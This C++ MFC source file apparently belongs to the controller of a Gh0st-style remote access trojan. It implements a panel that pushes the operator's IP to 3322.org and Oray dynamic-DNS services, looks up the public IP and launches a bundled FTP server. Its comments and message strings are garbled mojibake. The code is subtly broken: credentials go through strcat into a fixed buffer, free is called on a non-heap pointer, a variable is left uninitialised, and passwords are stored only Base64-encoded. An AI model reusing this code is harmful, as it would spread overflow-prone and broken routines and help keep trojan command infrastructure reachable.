// UPDATEIP.cpp : implementation file
//

#include "stdafx.h"
#include "DHL_yk.h"
#include "UPDATEIP.h"
#include "PcView.h"
//#include "winuser.h"

#include "afxinet.h" //WinInet����Ҫ��ͷ�ļ�
#include <Shlwapi.h>

#include<stdio.h> 

//#include <windows.h>
//#include <UrlMon.h>
//#pragma comment(lib, "urlmon.lib")

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern BOOL IsFileExist(LPCTSTR strFileName);
/////////////////////////////////////////////////////////////////////////////
// CUPDATEIP

IMPLEMENT_DYNCREATE(CUPDATEIP, CFormView)

CUPDATEIP::CUPDATEIP()
	: CFormView(CUPDATEIP::IDD)
{
	CString Mistr;
	//{{AFX_DATA_INIT(CUPDATEIP)
	// 3322����IP����
	m_DnsUser = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("����", "DnsUser", "");	
	Mistr = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("����", "DnsPass", "");	
	m_DnsPass=Base64Decode(Mistr);   //����
	m_DnsDomain = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("����", "DnsDomain", "xxx.3322.org");

	// ����������IP����
	m_DnsUser1 = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("����", "DnsUser1", "");	
	Mistr = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("����", "DnsPass1", "");	
	m_DnsPass1=Base64Decode(Mistr);   //����
	m_DnsDomain1 = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("����", "DnsDomain1", "xxx.oicp.net");

	//}}AFX_DATA_INIT
}

//CUPDATEIP::~CUPDATEIP()
//{
//}

void CUPDATEIP::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CUPDATEIP)
	DDX_Control(pDX, IDC_COMBO_DNSIP, m_Combo_DnsIP);
//	DDX_Text(pDX, IDC_FTPURL, m_FtpUrl);
//	DDV_MaxChars(pDX, m_FtpUrl, 200);
//	DDX_Text(pDX, IDC_EDIT_FTPUSER, m_FtpUser);
//	DDV_MaxChars(pDX, m_FtpUser, 100);
//	DDX_Text(pDX, IDC_EDIT_FTPPORT, m_FtpPort);
//	DDV_MinMaxUInt(pDX, m_FtpPort, 0, 65500);
//	DDX_Text(pDX, IDC_EDIT_FTPPASS, m_FtpPass);
//	DDV_MaxChars(pDX, m_FtpPass, 100);
//	DDX_Text(pDX, IDC_EDIT_FTPIP, m_FtpIP);
//	DDV_MaxChars(pDX, m_FtpIP, 100);
	DDX_Text(pDX, IDC_EDIT_DNSUSER, m_DnsUser);
	DDV_MaxChars(pDX, m_DnsUser, 100);
	DDX_Text(pDX, IDC_EDIT_DNSPASS, m_DnsPass);
	DDV_MaxChars(pDX, m_DnsPass, 100);
	DDX_Text(pDX, IDC_EDIT_DNSDOMAIN, m_DnsDomain);
	DDV_MaxChars(pDX, m_DnsDomain, 100);

	DDX_Text(pDX, IDC_EDIT_DNSUSER1, m_DnsUser1);
	DDV_MaxChars(pDX, m_DnsUser1, 100);
	DDX_Text(pDX, IDC_EDIT_DNSPASS1, m_DnsPass1);
	DDV_MaxChars(pDX, m_DnsPass1, 100);
	DDX_Text(pDX, IDC_EDIT_DNSDOMAIN1, m_DnsDomain1);
	DDV_MaxChars(pDX, m_DnsDomain1, 100);
//	DDX_Text(pDX, IDC_COMBO_FTPIP, m_zifushuan);
//	DDV_MaxChars(pDX, m_zifushuan, 200);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CUPDATEIP, CFormView)
	//{{AFX_MSG_MAP(CUPDATEIP)
	ON_BN_CLICKED(IDC_BTN_DNSUPDATE, OnBtnDnsupdate)
	ON_BN_CLICKED(IDC_BTN_FTPUPDATE, OnBtnFtpupdate)
	ON_BN_CLICKED(IDC_BUTTON2, OnB_IP)
	ON_BN_CLICKED(IDC_FTPServer, OnFTPServer)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CUPDATEIP diagnostics

#ifdef _DEBUG
void CUPDATEIP::AssertValid() const
{
	CFormView::AssertValid();
}

void CUPDATEIP::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CUPDATEIP message handlers

void CUPDATEIP::OnInitialUpdate() 
{
	CenterWindow();		

	UpdateData(FALSE);	
}




void CUPDATEIP::OnBtnDnsupdate()   //3322����IP����
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("����", "DnsUser", m_DnsUser);
	CString Mistr;
	Mistr=Base64Encode(m_DnsPass);   //���ܺ���
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("����", "DnsPass", Mistr);//��������
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("����", "DnsDomain", m_DnsDomain);

	CString id,pass,dns,ip; 
	char a[256]="http://";
	char *b="@members.3322.org/dyndns/update?system=dyndns&hostname=";
	char *c="&myip=";
	char *d="&wildcard=OFF";
	GetDlgItem(IDC_EDIT_DNSUSER)->GetWindowText(id);
	GetDlgItem(IDC_EDIT_DNSPASS)->GetWindowText(pass);
	GetDlgItem(IDC_EDIT_DNSDOMAIN)->GetWindowText(dns);
	GetDlgItem(IDC_COMBO_DNSIP)->GetWindowText(ip);
	strcat(a,id);
	strcat(a,":");
	strcat(a,pass);
	strcat(a,b);
	strcat(a,dns);
	strcat(a,c);
	strcat(a,ip);
	strcat(a,d);

	HINTERNET hNet = ::InternetOpen("3322", //��HTTPЭ��ʹ��ʱ������������⸳ֵ
		PRE_CONFIG_INTERNET_ACCESS, //��������ָʾWin32���纯��ʹ�õǼ���Ϣȥ����һ��������
		NULL, 
		INTERNET_INVALID_PORT_NUMBER, //ʹ��INTERNET_INVALID_PORT_NUMBER�൱���ṩȴʡ�Ķ˿���
		0 //��־ȥָʾʹ�÷��ؾ����Ľ�����Internet������"��"Ϊ�ص���������״̬��Ϣ 
		); 
	
	HINTERNET hUrlFile = ::InternetOpenUrl(hNet, //��InternetOpen���صľ�� 
		(char *)a, //��Ҫ�򿪵�URL 
		NULL, //��������������Ͷ������Ϣ,һ��ΪNULL 
		0, //��������������Ͷ������Ϣ,һ��Ϊ 0 
		INTERNET_FLAG_RELOAD, //InternetOpenUrl��Ϊ�ı�־ 
		0); //��Ϣ�����ᱻ�͵�״̬�ص����� 
	
	char buffer[1024] ; 
	DWORD dwBytesRead = 0; 
	BOOL bRead = ::InternetReadFile(hUrlFile, //InternetOpenUrl���صľ�� 
		buffer, //�������ݵĻ����� 
		sizeof(buffer), 
		&dwBytesRead); //ָ��������뻺�����ֽ����ı�����ָ��; 
	//�������ֵ��TRUE����������ָ��0�����ļ��Ѿ��������ļ���ĩβ�� 
	
	::InternetCloseHandle(hUrlFile) ; 
	::InternetCloseHandle(hNet) ;
	
	CString HotName="ϣ������IP����";
	if(buffer>0)
	{
		if(strstr(buffer,"good"))
			MessageBox("���³ɹ����Ѹ�������IP ...\r\n"+ip+"\r\n", HotName, MB_OK | MB_ICONASTERISK);
		else if(strstr(buffer,"nochg"))
			MessageBox("�洢IP��ͬ��û�иı�IP ...", HotName, MB_OK | MB_ICONASTERISK);
		else if(strstr(buffer,"nohost"))
			MessageBox("����ʧ�ܣ������Ƿ�������ȷ ...", HotName, MB_OK | MB_ICONWARNING);
		else if(strstr(buffer,"badauth"))
			MessageBox("��֤ʧ�ܣ��û������������ ...", HotName, MB_OK | MB_ICONWARNING);
		else
			MessageBox("δ֪������ ...", HotName, MB_OK | MB_ICONWARNING);
	}

}


void CUPDATEIP::OnBtnFtpupdate()  //����������IP����
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("����", "DnsUser1", m_DnsUser1);
	CString Mistr;
	Mistr=Base64Encode(m_DnsPass1);   //���ܺ���
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("����", "DnsPass1", Mistr);//��������
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("����", "DnsDomain1", m_DnsDomain1);

	CString id,pass,dns,ip; 
	char a[256]="http://";
	char *b="@ddns.oray.com/ph/update?hostname=";
	char *c="&myip=";
	GetDlgItem(IDC_EDIT_DNSUSER1)->GetWindowText(id);
	GetDlgItem(IDC_EDIT_DNSPASS1)->GetWindowText(pass);
	GetDlgItem(IDC_EDIT_DNSDOMAIN1)->GetWindowText(dns);
	GetDlgItem(IDC_COMBO_DNSIP1)->GetWindowText(ip);
	strcat(a,id);
	strcat(a,":");
	strcat(a,pass);
	strcat(a,b);
	strcat(a,dns);
	strcat(a,c);
	strcat(a,ip);

	HINTERNET hNet = ::InternetOpen("oray", //��HTTPЭ��ʹ��ʱ������������⸳ֵ
		PRE_CONFIG_INTERNET_ACCESS, //��������ָʾWin32���纯��ʹ�õǼ���Ϣȥ����һ��������
		NULL, 
		INTERNET_INVALID_PORT_NUMBER, //ʹ��INTERNET_INVALID_PORT_NUMBER�൱���ṩȴʡ�Ķ˿���
		0 //��־ȥָʾʹ�÷��ؾ����Ľ�����Internet������"��"Ϊ�ص���������״̬��Ϣ 
		); 

	HINTERNET hUrlFile = ::InternetOpenUrl(hNet, //��InternetOpen���صľ�� 
		(char *)a, //��Ҫ�򿪵�URL 
		NULL, //��������������Ͷ������Ϣ,һ��ΪNULL 
		0, //��������������Ͷ������Ϣ,һ��Ϊ 0 
		INTERNET_FLAG_RELOAD, //InternetOpenUrl��Ϊ�ı�־ 
		0); //��Ϣ�����ᱻ�͵�״̬�ص����� 
	
	char buffer[1024] ; 
	DWORD dwBytesRead = 0; 
	BOOL bRead = ::InternetReadFile(hUrlFile, //InternetOpenUrl���صľ�� 
		buffer, //�������ݵĻ����� 
		sizeof(buffer), 
		&dwBytesRead); //ָ��������뻺�����ֽ����ı�����ָ��; 
	//�������ֵ��TRUE����������ָ��0�����ļ��Ѿ��������ļ���ĩβ�� 
	
	::InternetCloseHandle(hUrlFile) ; 
	::InternetCloseHandle(hNet) ;
	
	CString HotName="ϣ������IP����";
	if(buffer>0)
	{
		if(strstr(buffer,"good"))
			MessageBox("���³ɹ����Ѹ�������IP ...\r\n"+ip+"\r\n", HotName, MB_OK | MB_ICONASTERISK);
		else if(strstr(buffer,"nochg"))
			MessageBox("�洢IP��ͬ��û�иı�IP ...", HotName, MB_OK | MB_ICONASTERISK);
		else if(strstr(buffer,"notfqdn"))
			MessageBox("����ʧ�ܣ�δ����������� ...", HotName, MB_OK | MB_ICONWARNING);
		else if(strstr(buffer,"nohost"))
			MessageBox("���������ڻ�δ������� ...",HotName, MB_OK | MB_ICONWARNING);
		else if(strstr(buffer,"abuse"))
			MessageBox("Ƶ���������֤ʧ�� ...",HotName, MB_OK | MB_ICONWARNING);
		else if(strstr(buffer,"badauth"))
			MessageBox("����ʧ�ܣ��û������������ ...",HotName, MB_OK | MB_ICONWARNING);
		else
			MessageBox("δ֪������ ...",HotName, MB_OK | MB_ICONWARNING);
	}
}


void CUPDATEIP::OnB_IP()   //����IP
{
	CString pBuf = GetIPAddress();
	SetDlgItemText(IDC_COMBO_DNSIP, pBuf);
	SetDlgItemText(IDC_COMBO_DNSIP1, pBuf);
}

CString CUPDATEIP::Base64Encode(LPCTSTR lpszSrc)   //���ܺ���
{
 ASSERT(lpszSrc != NULL && AfxIsValidString(lpszSrc));
 const char BASE64_ENCODE_TABLE[64] = {
  65,  66,  67,  68,  69,  70,  71,  72,  // 00 - 07
   73,  74,  75,  76,  77,  78,  79,  80,  // 08 - 15
   81,  82,  83,  84,  85,  86,  87,  88,  // 16 - 23
   89,  90,  97,  98,  99, 100, 101, 102,  // 24 - 31
   103, 104, 105, 106, 107, 108, 109, 110,  // 32 - 39
   111, 112, 113, 114, 115, 116, 117, 118,  // 40 - 47
   119, 120, 121, 122,  48,  49,  50,  51,  // 48 - 55
   52,  53,  54,  55,  56,  57,  43,  47 };// 56 - 63

  unsigned int iTest;

  LPCTSTR pInBuffer=lpszSrc;

  int nSize = (int)_tcslen(lpszSrc);
  char* pOutBuffer=new char[nSize/3*4+5];
  ZeroMemory(pOutBuffer,nSize/3*4+5);

  for(UINT i=0;i<_tcslen(lpszSrc) / 3;i++)
  {
   iTest = (unsigned char) *pInBuffer++;
   iTest = iTest << 8;

   iTest = iTest | (unsigned char) *pInBuffer++;
   iTest = iTest << 8;

   iTest = iTest | (unsigned char) *pInBuffer++;

   //��4 byte����д���������
   pOutBuffer[3] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[2] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[1] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[0] = BASE64_ENCODE_TABLE[iTest];
   pOutBuffer+=4;
  }

  //����β��
  switch (_tcslen(lpszSrc) % 3)
  {
  case 0:
   break;
  case 1:
   iTest = (unsigned char) *pInBuffer;
   iTest = iTest << 4;
   pOutBuffer[1] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[0] = BASE64_ENCODE_TABLE[iTest];
   pOutBuffer[2] = '='; //��'='Ҳ����64�����ʣ�ಿ��
   pOutBuffer[3] = '=';
   break;
  case 2:
   iTest = (unsigned char) *pInBuffer++;
   iTest = iTest << 8;
   iTest = iTest | (unsigned char) *pInBuffer;
   iTest = iTest << 2;
   pOutBuffer[2] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[1] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[0] = BASE64_ENCODE_TABLE[iTest];
   pOutBuffer[3] = '='; // Fill remaining byte.
   break;
  }
  pOutBuffer-=nSize/3*4;
  CString strEncode=pOutBuffer;
  delete [] pOutBuffer;
  pOutBuffer=NULL;
  return strEncode;
}

CString CUPDATEIP::Base64Decode(LPCTSTR lpszSrc)  //���ܺ���
{
 ASSERT(lpszSrc != NULL && AfxIsValidString(lpszSrc));
 const unsigned int BASE64_DECODE_TABLE[256] = {
  255, 255, 255, 255, 255, 255, 255, 255, //  00 -  07
   255, 255, 255, 255, 255, 255, 255, 255, //  08 -  15
   255, 255, 255, 255, 255, 255, 255, 255, //  16 -  23
   255, 255, 255, 255, 255, 255, 255, 255, //  24 -  31
   255, 255, 255, 255, 255, 255, 255, 255, //  32 -  39
   255, 255, 255,  62, 255, 255, 255,  63, //  40 -  47
   52,  53,  54,  55,  56,  57,  58,  59, //  48 -  55
   60,  61, 255, 255, 255, 255, 255, 255, //  56 -  63
   255,   0,   1,   2,   3,   4,   5,   6, //  64 -  71
   7,   8,   9,  10,  11,  12,  13,  14, //  72 -  79
   15,  16,  17,  18,  19,  20,  21,  22, //  80 -  87
   23,  24,  25, 255, 255, 255, 255, 255, //  88 -  95
   255,  26,  27,  28,  29,  30,  31,  32, //  96 - 103
   33,  34,  35,  36,  37,  38,  39,  40, // 104 - 111
   41,  42,  43,  44,  45,  46,  47,  48, // 112 - 119
   49,  50,  51, 255, 255, 255, 255, 255, // 120 - 127
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255 };


  const int nSrcCount=(int)_tcslen(lpszSrc);
  int nSize=nSrcCount/4*3;
  if(lpszSrc[nSrcCount-1]=='=')
   nSize--;
  if(lpszSrc[nSrcCount-2]=='=')
   nSize--;
  char* pOutBuffer=new char[nSize+3];
  ZeroMemory(pOutBuffer,nSize+3);
  LPCTSTR pInBuffer=lpszSrc;
  UINT iTest,iPack;
  for(int i=0;i<nSize/3 ;i++)
  {
   for(int j=0;j<4;j++)
   {
    iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
    //InPtr++;
    if (iTest == 0xFF) 
    {
     j--;
     continue; //����255�Ƿ��ַ�
    }
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   pOutBuffer[2] = iPack;
   iPack = iPack >> 8;
   pOutBuffer[1] = iPack;
   iPack = iPack >> 8;
   pOutBuffer[0] = iPack;
   //׼��д���3λ
   pOutBuffer+= 3; iPack = 0;

  }
  switch(nSize%3)
  {
  case 1:
   iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
   if (iTest != 0xFF)
   {
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
   if (iTest != 0xFF)
   {
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   iPack = iPack >> 4;
   pOutBuffer[0] = iPack;
   pOutBuffer++;
   break;
  case 2:
   iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
   if (iTest != 0xFF)
   {
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
   if (iTest != 0xFF)
   {
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
   if (iTest != 0xFF)
   {
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   iPack = iPack >> 2;
   pOutBuffer[1] = iPack;
   iPack = iPack >> 8;
   pOutBuffer[0] = iPack;
   pOutBuffer+=2;
   break;
  default:
   break;
  }
  pOutBuffer-=nSize;
  CString strDecode=pOutBuffer;
  delete pOutBuffer;
  return strDecode;
}

/************************************************************************/         
/* ����˵����ȥ��ָ���ַ�                                           
/* ��    ������                                       
/* �� �� ֵ������int����                                          
/************************************************************************/ 
int CUPDATEIP::ReplaceStr(char* sSrc, char* sMatchStr, char* sReplaceStr)
{
	int StringLen;
	char caNewString[64];
	char* FindPos;
	FindPos =(char *)strstr(sSrc, sMatchStr);
	if( (!FindPos) || (!sMatchStr) )
		return -1;
	
	while( FindPos )
	{
		memset(caNewString, 0, sizeof(caNewString));
		StringLen = FindPos - sSrc;
		strncpy(caNewString, sSrc, StringLen);
		strcat(caNewString, sReplaceStr);
		strcat(caNewString, FindPos + strlen(sMatchStr));
		strcpy(sSrc, caNewString);
		
		FindPos =(char *)strstr(sSrc, sMatchStr);
	}
	free(FindPos);
	return 0;
}

/************************************************************************/         
/* ����˵������ȡӦ�ó���ǰĿ¼                                           
/* ��    ������                                       
/* �� �� ֵ������Ŀ¼·����CString�����ַ���                                         
/************************************************************************/        
CString GetExePath()       
{       
    char pathbuf[260];          
    int  pathlen = ::GetModuleFileName(NULL,pathbuf,MAX_PATH);          
    // �滻������       
    while(TRUE)          
    {          
        if(pathbuf[pathlen--]=='\\')
            break;          
    }          
    pathbuf[++pathlen]= 0*0;          
    CString  fname = pathbuf;          
    return   fname;          
}

/************************************************************************/          
/* ����˵������ȡ��ǰ����IP��ַ                                            
/* ��    ������                                        
/* �� �� ֵ����������IP��ַ��CString�����ַ���                                             
/************************************************************************/     
/* 
CString CUPDATEIP::GetIPAddress()     //�о�http://city.ip138.com/city0.asp ��ʱ�����Ի�ȡ����IP
{     
    char buf[MAX_PATH] = {0};     
    char chTempIp[128]= {0};    
    char chIP[64]= {0};    
    CString strPath;     
    strPath = GetExePath() + "\\netip.ini";
    URLDownloadToFile(0,"http://city.ip138.com/city0.asp",strPath,0,NULL);      

    FILE *fp=fopen( strPath, "r" );     
    if ( fp != NULL )      
    {
        fseek(fp, 0, SEEK_SET);     
        fread(buf,1,256,fp);     
        fclose(fp);     
        char* iIndex = strstr(buf,"[");     
        if (iIndex)      
        {   
			int nBufles = strlen(iIndex); 
			char* iIndey = strstr(buf,"]");
			int nBuflem = strlen(iIndey); 
			sprintf( chTempIp,"%s",iIndex); 
			int t=0;
			for(int m=0;m<(nBufles-nBuflem);m++)
			{
				chIP[m] = chTempIp[m]; 
			}
			ReplaceStr(chIP,"[","");
			DeleteFile(strPath);
		}
    }     
    CString strTemp="";     
    if(chIP != "")     
    {     
        strTemp.Format("%s",chIP);     
    }     
    return strTemp;     
}     
*/

int CUPDATEIP::memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}

char* CUPDATEIP::substr(char   *str,int   istar,int   iend) 
{  
	char   *p; 
	char   p1[100]={0}; 
	int   ip=0; 

    p=str; 
    ip=strlen(p); 
    if(istar> ip) 
		return   NULL; 
    else 
    { 
		p+=istar-1; 
    } 
    int   ipp=strlen(p); 
    if(ipp <iend) 
		strcpy(p1,p); 
    else 
    { 
		memcpy(p1,p,iend); 
    }
	strcpy(str,p1);
    return   str; 
} 

/************************************************************************/          
/* ����˵������ȡ��ǰ����IP��ַ                                            
/* ��    ������                                        
/* �� �� ֵ����������IP��ַ��CString�����ַ���                                             
/************************************************************************/      
CString CUPDATEIP::GetIPAddress()     
{     
    char buf[MAX_PATH] = {0};     
    char chTempIp[128]= {0};    
   
    CString strPath;     
    strPath = GetExePath() + "\\netip.ini";
    URLDownloadToFile(0,"http://ddns.oray.com/checkip",strPath,0,NULL);

    FILE *fp=fopen( strPath, "r" );     
    if ( fp != NULL )      
    {
        fseek(fp, 0, SEEK_SET);     
        fread(buf,1,256,fp);     
        fclose(fp);     

		DWORD SizePoint;
		SizePoint = memfind(buf,"Address:",sizeof(buf),0);
		substr(buf,SizePoint+8,17);
		ReplaceStr(buf,":","");
		ReplaceStr(buf," ","");
		ReplaceStr(buf,"<","");
		ReplaceStr(buf,"/","");
		ReplaceStr(buf,"b","");
		ReplaceStr(buf,"o","");
		ReplaceStr(buf,"d","");
		ReplaceStr(buf,"y","");
		DeleteFile(strPath);
    }     
    CString strTemp="";     
    if(buf != "")     
    {     
        strTemp.Format("%s",buf);     
    }     
    return strTemp;     
}     

void CUPDATEIP::OnFTPServer() 
{
	// TODO: Add your control notification handler code here
	CHAR ModuletemDis[MAX_PATH]={0};
	sprintf(ModuletemDis,"%s\\Control\\FTPServer.exe",((CGh0stApp *)AfxGetApp())->ModuletemDir);   //����Ŀ¼�ͳ�������

	if(INVALID_FILE_ATTRIBUTES==GetFileAttributes(ModuletemDis))
	{
		MessageBox("FTP������FTPServer.exe�ļ���ʧ���޷�����FIP������... ","���棡",MB_OK);
		return;
	}

    ShellExecute(NULL,"open",ModuletemDis,NULL,NULL,SW_SHOW);   //�򿪳���
}
